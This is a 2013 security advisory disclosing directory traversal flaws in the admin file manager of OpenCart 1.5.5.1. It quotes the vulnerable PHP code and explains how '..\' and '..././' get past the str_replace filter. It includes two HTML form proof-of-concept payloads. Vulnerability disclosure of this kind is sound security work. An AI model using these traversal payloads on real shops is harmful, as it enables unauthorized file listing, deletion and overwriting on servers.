@@ -1,0 +1,123 @@
+[waraxe-2013-SA#098] - Directory Traversal Vulnerabilities in OpenCart 1.5.5.1
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 19. March 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-98.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+OpenCart is a turn-key ready "out of the box" shopping cart solution.
+You simply install, select your template, add products and your ready to start
+accepting orders.
+
+http://www.opencart.com/
+
+Affected are all OpenCart versions, from 1.4.7 to 1.5.5.1, maybe older too.
+
+###############################################################################
+1. Directory Traversal Vulnerabilities in "filemanager.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vectors:
+ 1. user-supplied POST parameters "directory", "name", "path", "from", "to"
+Preconditions:
+ 1. Logged in as admin with filemanager access privileges
+ 
+Script "filemanager.php" offers for OpenCart admins various file related services:
+directory listing and creation, image file listing, file copy/move/unlink, upload,
+image resize. By the design OpenCart admin can manage files and directories only
+inside specific subdirectory "image/data/". It means, that even if you have
+OpenCart admin privileges, you still are not suppose to get access to the files
+and directories below "image/data/". So far, so good.
+But what about directory traversal? Let's have a look at the source code.
+
+PHP script "admin/controller/common/filemanager.php" line 66:
+------------------------[ source code start ]----------------------------------
+public function directory() {    
+    $json = array();
+    
+    if (isset($this->request->post['directory'])) {
+        $directories = glob(rtrim(DIR_IMAGE . 'data/' . 
+           str_replace('../', '', $this->request->post['directory']), '/') . 
+           '/*', GLOB_ONLYDIR); 
+        
+        if ($directories) {
+            $i = 0;
+        
+            foreach ($directories as $directory) {
+                $json[$i]['data'] = basename($directory);
+                $json[$i]['attributes']['directory'] = 
+                   utf8_substr($directory, strlen(DIR_IMAGE . 'data/'));
+...
+    
+    $this->response->setOutput(json_encode($json));
+------------------------[ source code end ]------------------------------------
+
+We can see, that directory traversal is prevented by removing "../" substrings
+from user submitted parameters. At first look this seems to be secure enough -
+if we can't use "../", then directory traversal is impossible, right?
+Deeper analysis shows couple of shortcomings in specific filtering method.
+First problem - if OpenCart is hosted on Windows platform, then it's possible
+to use "..\" substring for directory traversal.
+
+Test (parameter "token" must be valid):
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/oc1551/admin/index.php?route=common/filemanager/directory&token=92aa6ac32b4c8e7a175c3dc9f7754d25" method="post">
+<input type="hidden" name="directory" value="..\..\..\">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Server response is in JSON format and contains listing of subdirectories outside
+of OpenCart main directory.
+
+Second problem - filtering with "str_replace" can be tricked by using custom
+strings. If we use "..././" substring, then after filtering in becomes "../".
+So it appears, that implemented anti-traversal code is ineffective and can
+be bypassed.
+
+Test (parameter "token" must be valid):
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/oc1551/admin/index.php?route=common/filemanager/directory&token=92aa6ac32b4c8e7a175c3dc9f7754d25" method="post">
+<input type="hidden" name="directory" value="..././..././..././..././">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Server response is exactly same as in previous test - information about directory
+structure outside of OpenCart main directory has been disclosed.
+
+PHP script "filemanager.php" contains 14 uses of "str_replace('../', ''," code.
+Most of the public functions in "filemanager.php" are affected by directory
+traversal vulnerability:
+
+public function directory() -> listing of subdirectories
+public function files() -> listing of image files
+public function create() -> creation of new directories
+public function delete() -> deletion of arbitrary files and directories
+public function move() -> renaming of files or directories
+public function copy() -> copying of files or directories
+public function rename() -> renaming of files or directories
+public function upload() -> uploading of image or flash files
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
